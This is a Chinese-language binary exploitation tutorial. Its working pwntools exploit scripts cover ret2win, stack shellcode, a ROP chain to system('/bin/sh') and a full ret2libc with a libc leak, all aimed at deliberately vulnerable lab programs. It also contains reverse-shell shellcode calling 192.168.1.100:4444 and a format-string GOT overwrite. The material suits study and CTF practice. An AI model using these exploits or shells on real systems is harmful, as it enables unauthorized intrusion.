    1. 📌 栈溢出原理——覆盖返回地址¶

    🏪 生活场景：书架被推倒¶

    你的书架上摞着一排书：

    最上面: 你的记事本（局部变量 buf[8]）
往下一层: 一张书签（返回地址——记着"看完了翻回第42页"）
再往下一层: 另一张书签（旧的 RBP）
最下面: main 的书（main 的栈帧）

    你开始在"记事本"（buf）上写字。但今天的笔记特别多——你写了 8 行、9 行、10 行……笔迹超出了记事本的范围，写到了下面那张书签上！

    书签上原本写着"第 42 页"，现在被你写成了"第 999 页"。

    你看完这一节，准备翻回书签标记的页面——翻到了第 999 页。但第 999 页根本不是原来的内容！——你翻到了一个完全陌生的地方。

    这就是栈溢出。 buf 写超了 → 覆盖了返回地址 → ret 指令把被覆盖的地址放入 RIP → CPU 跳到了攻击者指定的地方。

    🔍 重温栈帧（如果你忘了——现在就是复习的时候）¶

            高地址
        ┌──────────────────────┐
        │  main 的局部变量       │
        ├──────────────────────┤
        │  ★ 返回地址           │  ← call 指令压入的！func 返回时取出来放 RIP
        ├──────────────────────┤
        │  旧的 RBP             │  ← push rbp 压入的
        ├──────────────────────┤  ← RBP
        │  buf[63]  ... buf[0] │  ← 从低地址向高地址填充
        ├──────────────────────┤
        │  未使用空间            │  ← RSP
        └──────────────────────┘
        低地址

    溢出过程： 

    往 buf 写 64 字节  → 正常，buf 刚好 64
往 buf 写 72 字节  → 多出来的 8 字节覆盖了"旧的 RBP"
往 buf 写 80 字节  → 多出来的 16 字节覆盖了"旧的 RBP" + "返回地址"！

    💻 漏洞程序与攻击脚本¶

    // vuln.c —— 故意制造漏洞的程序
#include <stdio.h>
#include <string.h>

void win() {
    printf("🎉 你成功劫持了程序控制流！\n");
    execve("/bin/sh", NULL, NULL);  // 拿到 shell！
}

void vulnerable() {
    char buf[64];
    printf("buf 地址: %p\n", buf);
    printf("win 地址: %p\n", win);
    gets(buf);  // ★ 故意的！不检查输入长度
}

int main() {
    vulnerable();
    return 0;
}

    # 编译（关掉所有保护）
gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
# -fno-stack-protector: 关栈金丝雀
# -z execstack: 允许栈上执行代码
# -no-pie: 代码地址固定（不随机化）

    💻 攻击第一步：找偏移量¶

    from pwn import *

# 生成 200 字节的不重复字符串
pattern = cyclic(200)
print(pattern[:100])  # aaaabaaacaaadaaaeaaaf...

# 把 pattern 喂给程序
p = process("./vuln")
p.sendline(pattern)
p.wait()

# 程序崩溃！看 core dump 或者 GDB 里的 RIP 值
# 假设 RIP = 0x6161616c (cyclic 中的某个子串)
# 在 pwntools 里算偏移:
# offset = cyclic_find(0x6161616c)
# print(f"偏移量: {offset}")  # 比如 72

# → 前 72 字节后就是返回地址！
# 72 = 64 (buf) + 8 (RBP)

    💻 攻击第二步：ret2win¶

    from pwn import *

elf = ELF("./vuln")
win_addr = elf.symbols['win']    # win 函数的地址
print(f"win @ {hex(win_addr)}")

p = process("./vuln")

# 构造 payload
offset = 72                       # 64 (buf) + 8 (rbp)
payload = b"A" * offset          # 填充
payload += p64(win_addr)         # 覆盖返回地址 = win 函数地址

p.sendline(payload)
p.interactive()                   # 拿到 shell！

    🧪 在 GDB 里观察整个过程¶

    gdb ./vuln
(gdb) b *vulnerable+38           # 在 ret 指令处打断点（先用 disas vulnerable 找 ret 的地址）
(gdb) r < payload.bin
(gdb) x/20gx $rsp                # 看栈——返回地址已经被改成 win_addr 了！
(gdb) i r rip                    # RIP 还是正常的
(gdb) ni                         # 执行 ret 指令
(gdb) i r rip                    # ★ RIP 变成了 win_addr！
(gdb) c                          # 继续——你应该进入 win() 了

    2. shellcode 编写¶

    🏪 生活场景：闯入者自带的"作案工具包"¶

    你不能只是把程序跳到一个空白的地方——你得让它做点什么。shellcode 就是一段短小精悍的机器码，通常 20-60 字节，完成一件事：

    • 启动一个 shell（execve("/bin/sh")）
    • 反向连接到你的服务器（反弹 shell）
    • 读取某个文件的内容
    • 添加一个管理员账户

    🔍 shellcode 的两种类型¶

    ① execve("/bin/sh") 型（本地 shell）
   适用场景：你在目标机器上已经能交互（比如通过 nc 连过去）
   效果：启动一个 shell，你直接操作

② 反弹 shell 型（Reverse Shell）
   适用场景：防火墙阻止入站连接，但允许出站
   原理：目标机器主动连回你的服务器
   效果：你获得一个交互式 shell

③ bind shell 型
   原理：目标机器在某个端口开一个监听
   效果：你从外部连过去

    💻 用 pwntools 生成 shellcode¶

    from pwn import *

# x86-64 Linux shellcode
context.arch = 'amd64'
context.os = 'linux'

# execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.sh())
print(f"shellcode 长度: {len(shellcode)} 字节")
print(f"shellcode 十六进制: {shellcode.hex()}")
print(f"shellcode 可读形式: {shellcode}")

# 32位 x86 版本
context.arch = 'i386'
shellcode_32 = asm(shellcraft.sh())
print(f"\n32位 shellcode 长度: {len(shellcode_32)} 字节")

# 反弹 shell（连接到 192.168.1.100:4444）
context.arch = 'amd64'
rev_shell = asm(shellcraft.connect("192.168.1.100", 4444))
print(f"\n反弹 shell 长度: {len(rev_shell)} 字节")

    💻 把 shellcode 放进攻击中¶

    # 情景：栈可执行（NX 关闭），ASLR 关闭，PIE 关闭
from pwn import *

context.arch = 'amd64'
p = process("./vuln")

# 1. 获取 buf 的地址（程序打印了）
p.recvuntil(b"buf 地址: ")
buf_addr = int(p.recvline().strip(), 16)
print(f"buf @ {hex(buf_addr)}")

# 2. 生成 shellcode
shellcode = asm(shellcraft.sh())

# 3. 构造 payload
offset = 72
payload = shellcode                      # shellcode 放 buf 开头
payload += b"A" * (offset - len(shellcode))  # 填充剩余空间
payload += p64(buf_addr)                 # 返回地址指向 buf（shellcode 的位置）

p.sendline(payload)
p.interactive()  # 🎉 拿到 shell！

    注意：现代系统默认开启 NX（栈不可执行）。 上面的攻击在默认配置下会失败——栈上的代码不可执行，CPU 会拒绝。这就是为什么我们需要 §3 的 ROP 技术。

    3. 📌 ROP——面向返回编程¶

    🏪 生活场景：在图书馆用索书号拼出一本书¶

    图书馆规定：你不能带自己的书进馆（栈不可执行！不能注入自己的代码）。

    但你发现了一个秘密：图书馆里所有书的每一页底部都有一行小字（以 ret 结尾的指令片段 = gadget）。你可以用索书号（栈上的返回地址），让管理员一页一页地去不同的书里读不同的片段。

    "请翻到《百科全书》第 42 页，读一行：'把 RDI 设为某个值'（pop rdi; ret）"
"然后翻到《莎士比亚全集》第 108 页，读一行：'执行 system 函数'（call system）"

管理员按你的索书号顺序翻书——虽然你没有带自己的书进来，
但你用图书馆里已有的内容拼出了你想要的行为。

    ROP 就是：用已有的以 ret 结尾的指令片段（gadget），通过栈上的返回地址把它们串起来，实现攻击目的。

    🔍 什么是 Gadget？¶

    ; 程序里某个地方的代码:
;   0x401234: pop rdi
;   0x401235: ret

; → 这就是一个 gadget: "pop rdi; ret"
; → 地址: 0x401234

; 用法:
; 在栈上排好: [gadget地址] [你想放进RDI的值] [下一个地址...]
; 程序执行到 ret → pop rip → RIP = gadget地址
; → 执行 pop rdi → RDI = 栈上的下一个值
; → 执行 ret → pop rip → RIP = 栈上的再下一个值
; → 完美串起来了！

    🔍 ROP 链构造完整过程¶

    目标: 64位 Linux，调用 system("/bin/sh")
需要: 
  ① 把 "/bin/sh" 的地址放进 RDI（第一个参数）
  ② 然后调用 system()

ROP 链在栈上的排布:
┌──────────────────────┐
│ system 的地址         │ ← ④ 执行 system("/bin/sh") → 拿到 shell！
├──────────────────────┤
│ "/bin/sh" 字符串地址   │ ← ③ pop rdi 时，这个值被弹出到 RDI
├──────────────────────┤
│ pop rdi; ret 地址     │ ← ② ret 到这里，执行 pop rdi; ret
├──────────────────────┤
│ ret 地址（栈对齐用）    │ ← ① 先 ret 到这里（某些系统需要栈 16 字节对齐）
├──────────────────────┤
│ AAAAAAAA...（填充）   │
└──────────────────────┘

    💻 完整的 ROP 攻击脚本¶

    from pwn import *

context.arch = 'amd64'
elf = ELF("./vuln")
rop = ROP(elf)

# 找 gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
print(f"pop rdi; ret @ {hex(pop_rdi)}")

# 关键地址
system_addr = elf.plt['system']      # system 在 PLT 中的地址
binsh_addr = next(elf.search(b'/bin/sh'))  # 程序里的 "/bin/sh" 字符串

# 构造 ROP 链
offset = 72
payload = b"A" * offset
payload += p64(ret)          # 栈对齐
payload += p64(pop_rdi)      # gadget: pop rdi; ret
payload += p64(binsh_addr)   # RDI = "/bin/sh"
payload += p64(system_addr)  # system(RDI) = system("/bin/sh")

p = process("./vuln")
p.sendline(payload)
p.interactive()  # 🎉 shell!

    4. 格式化字符串漏洞¶

    🏪 生活场景：被黑客忽悠的快递分拣员¶

    快递分拣员的工作：看快递单，把包裹放进对应的柜子。

    printf("您的包裹在 %d 号柜", 柜子编号);
分拣员：%d → 取下一个参数（柜子编号）→ 打印出来

    现在攻击者控制了快递单的内容：

    攻击者发给分拣员的指令: "请打印: %x %x %x %x"
分拣员：%x → 从栈上取一个值（十六进制）→ 打印
        %x → 再取一个 → 打印
        ... 把调用者的栈上的数据全读出来了！

更危险的: "%n"
→ %n 不是读数据，是写数据！把"已经打印了多少字符"写进指定的内存地址！
→ 攻击者可以用 %n 改写任意内存地址的值

    💻 格式化字符串攻击三步走¶

    // 漏洞代码
void vulnerable() {
    char buf[128];
    fgets(buf, sizeof(buf), stdin);
    printf(buf);  // ★ 用户输入直接做了格式化字符串！
}

    攻击三步:

① 泄露栈数据（了解栈上有什么）:
  输入: %p.%p.%p.%p.%p.%p.%p.%p
  输出: 栈上 8 个 8 字节值
  → 可能包含: canary 值、libc 地址、栈地址

② 定位"你写的地址"在栈上的位置:
  输入: AAAAAAAA%7$p
  输出: AAAAAAAA0x4141414141414141
  → 说明第 7 个参数指向你输入的开头（"AAAAAAAA"）

③ 用 %n 写任意地址:
  输入: \xfc\xd9\xff\xbf%7$n
  → 把地址 0xbffff9fc 写在开头
  → %7$n = 向第 7 个参数指向的地址写入"已经打印的字符数"
  → 覆盖 GOT 表中 printf 的地址为 system 的地址
  → 下次调用 printf → 实际调用 system！

    5. 堆利用入门¶

    🏪 生活场景：仓库里调包货物¶

    堆 = 仓库。你向管理员申请"我要 64 个货架"（malloc(64)）。管理员分给你第 3 排的 64 个货架。

    堆溢出：你往 64 个货架里塞了 100 箱货物——多出来的 36 箱挤到了隔壁的货架（下一个堆块）。如果隔壁货架上存着重要的管理标签（堆块头部），你就改写了标签——管理员下次整理仓库时会出错。

    堆利用比栈溢出复杂很多。 栈溢出 = 覆盖返回地址，原理清晰。堆利用涉及复杂的分配器内部机制（fastbin、tcache、unsorted bin 等）。建议先精通栈溢出（1-4 节），再碰堆。

    🔍 堆块结构¶

    已分配的堆块:
┌──────────────┐
│ prev_size    │ ← 前一个块的大小（如果前一个块空闲）
├──────────────┤
│ size + flags │ ← 本块大小，最低 3 位是标志位
├──────────────┤
│ 用户数据      │ ← malloc 返回的指针指向这里！（你往这里写）
│ ...          │
└──────────────┘

溢出: 往用户数据写超过分配大小 → 覆盖下一个堆块的头部或数据

    堆漏洞常见类型速览¶

    类型 原理 难度
    堆溢出 写越界覆盖下一个堆块 ⭐⭐
    Use-After-Free (UAF) free 后继续用指针 ⭐⭐⭐
    Double Free 对同一块 free 两次 → 破坏空闲链表 ⭐⭐
    Fastbin Attack 利用 fastbin 的单链表结构改写任意地址 ⭐⭐⭐
    Tcache Poisoning 利用 tcache 实现任意地址分配 ⭐⭐⭐

    6. 保护机制与绕过¶

    现代系统默认开了多层保护。每次攻击都要经过"先绕过保护、再控制 RIP"的过程。

    ┌──────────────────────────────────────────────────────┐
│                    保护机制全览                         │
├────────────┬─────────────────┬───────────────────────┤
│ 机制       │ 防什么           │ 怎么绕过               │
├────────────┼─────────────────┼───────────────────────┤
│ NX/DEP    │ 栈/堆上的代码    │ ROP（用已有的代码）      │
│            │ 不可执行         │ ret2libc（用 libc 函数） │
├────────────┼─────────────────┼───────────────────────┤
│ ASLR      │ 地址随机化       │ ★ 先泄露一个地址         │
│            │ 栈/堆/libc 基址  │ 然后计算偏移            │
├────────────┼─────────────────┼───────────────────────┤
│ Canary    │ 栈溢出覆盖       │ 先泄露 canary 值        │
│            │ 返回地址前       │ 写回正确的 canary       │
│            │ 先检查"金丝雀"   │                        │
├────────────┼─────────────────┼───────────────────────┤
│ PIE       │ 代码段地址随机化 │ 先泄露代码地址           │
│            │ （和 ASLR 类似） │ 然后计算基址             │
├────────────┼─────────────────┼───────────────────────┤
│ Full RELRO│ GOT 表只读       │ 改其他可写区域           │
│            │ 不能改函数指针   │ 或攻击 __malloc_hook 等  │
└────────────┴─────────────────┴───────────────────────┘

    🔍 NX（栈不可执行）— 最基础的绕过：ret2libc¶

    NX 禁止在栈上执行代码。你的 shellcode 放栈上？不能跑了。

    绕过： 不用你的 shellcode，用 libc 里已有的 system() 函数。libc 是可执行的。栈上只放地址（数据），不执行代码。

    🔍 ASLR（地址随机化）— 绕过：先泄露，再计算¶

    每次运行程序，libc 的基址是随机的。上次用到的 system 地址是 0x7f1234567890，这次可能是 0x7f9876543210。

    绕过：ret2libc（下一节详细讲）——先用 puts/printf 泄露 libc 中某个函数的真实地址，减去已知偏移，算出 libc 基址，再算出 system 和 /bin/sh 的真实地址。

    🔍 Canary（栈金丝雀）— 绕过：先泄露¶

    编译器在"返回地址"之前插入一个随机值（金丝雀）。函数返回前，检查金丝雀是否变了——如果变了说明发生了栈溢出。

    绕过： 先通过其他漏洞（如格式化字符串 %p 泄露）读到 canary 值，然后在构造 payload 时把正确的 canary 值写回原位——这样 canary 检查就能通过。

    8. 🧪 ret2libc 完整教程——从零到 shell¶

    这是全书最硬核的实验。 请确保前面的内容都理解了再开始。这个实验要求：ASLR 开启、NX 开启、PIE 关闭（先关一个，降低难度）。

    环境准备¶

    // ret2libc.c
#include <stdio.h>

void vulnerable() {
    char buf[64];
    printf("buf @ %p\n", buf);   // 好心告诉你 buf 地址（实际攻击中需要自己泄露）
    gets(buf);                    // 栈溢出漏洞
}

int main() {
    vulnerable();
    return 0;
}

    # 编译: NX 开启（默认），ASLR 开启（系统默认），PIE 关闭
gcc -fno-stack-protector -no-pie -o ret2libc ret2libc.c

# 确认保护
checksec ret2libc
# NX:     Enabled    ← 栈不可执行
# PIE:    Disabled   ← 代码段不随机
# Canary: Disabled   ← 没金丝雀
# RELRO:  Partial

    攻击脚本：完整 ret2libc¶

    from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# ===== 准备工作 =====
elf = ELF("./ret2libc")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  # ★ 需要和目标系统一样的 libc！

p = process("./ret2libc")
# p = remote("target.com", 1337)  # 远程打 CTF 题目时用

# 找 gadget
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# ===== Step 1: 泄露 puts 的真实地址 =====
# 思路: 调用 puts(puts@GOT) → puts 打印出自己 GOT 表里的地址
#       → 这个地址是 puts 在 libc 中的真实地址（ASLR 后的）

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

offset = 72  # 64 (buf) + 8 (rbp)

payload1 = b"A" * offset
payload1 += p64(pop_rdi)      # pop rdi; ret
payload1 += p64(puts_got)     # RDI = puts@GOT（puts 真实地址存放的位置）
payload1 += p64(puts_plt)     # 调用 puts 来打印
payload1 += p64(main_addr)    # ★ 泄露后回到 main，再来一次攻击

p.recvuntil(b"buf @ ")
buf_addr = int(p.recvline().strip(), 16)
print(f"[*] buf 地址: {hex(buf_addr)}")

p.sendline(payload1)

# 接收泄露的 puts 地址
# puts 打印完后会输出换行符
leaked = p.recvline().strip()
leaked_puts = u64(leaked.ljust(8, b'\x00'))  # 填充到 8 字节再解包
print(f"[*] 泄露的 puts 地址: {hex(leaked_puts)}")

# ===== Step 2: 计算 libc 基址 =====
libc.address = leaked_puts - libc.symbols['puts']
print(f"[*] libc 基址: {hex(libc.address)}")

# 现在所有 libc 函数的真实地址都知道了！
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
print(f"[*] system @ {hex(system_addr)}")
print(f"[*] /bin/sh @ {hex(binsh_addr)}")

# ===== Step 3: 第二轮攻击——真正拿 shell =====
payload2 = b"A" * offset
payload2 += p64(ret)            # 栈对齐
payload2 += p64(pop_rdi)        # pop rdi; ret
payload2 += p64(binsh_addr)     # RDI = "/bin/sh"
payload2 += p64(system_addr)    # system("/bin/sh")

p.sendline(payload2)
p.interactive()  # 🎉🎉🎉 拿到 shell！

    逐步骤回顾¶

    Step 1 — 泄露:
  payload1 做的事:
    ① 填充到返回地址（72 字节）
    ② pop rdi; ret → RDI = puts@GOT 的地址
    ③ 调用 puts(RDI) → 打印出 puts 在内存中的真实地址
    ④ 跳回 main → 程序又给你一次发送 payload 的机会

Step 2 — 计算:
  libc 基址 = 泄露的 puts 地址 - puts 在 libc 中的偏移（固定的）
  system 地址 = libc 基址 + system 在 libc 中的偏移（固定的）
  "/bin/sh" 地址 = libc 基址 + 字符串在 libc 中的偏移（固定的）

Step 3 — 攻击:
  payload2 做的事:
    ① 填充到返回地址
    ② pop rdi; ret → RDI = "/bin/sh" 的地址
    ③ 调用 system(RDI) → system("/bin/sh") → 拿到 shell！

    9. 🧪 保护机制逐个关闭实验¶

    用同一个漏洞程序，逐步打开保护，感受每层保护的作用。

    # 基础程序 vuln.c（上面那个有 gets 的）

# 实验 A: 无保护（最容易打）
gcc -fno-stack-protector -z execstack -no-pie -o vuln_A vuln.c
# → shellcode 直接放栈上执行，最简单

# 实验 B: NX 开启（栈不可执行）
gcc -fno-stack-protector -no-pie -o vuln_B vuln.c
# → shellcode 不能跑了 → 改用 ROP/ret2libc

# 实验 C: NX + Canary
gcc -fstack-protector -no-pie -o vuln_C vuln.c
# → 还要先泄露 canary → 用格式化字符串漏洞泄露

# 实验 D: NX + Canary + PIE（最接近真实）
gcc -fstack-protector -pie -o vuln_D vuln.c
# → 代码段也随机化 → 先泄露代码段地址
# → 加上 ASLR → 先泄露 libc 地址
# → 每一步都是"先泄露→再计算→再攻击"

    用上面的 ret2libc 脚本分别打 B/C/D，看看哪些步骤需要调整。
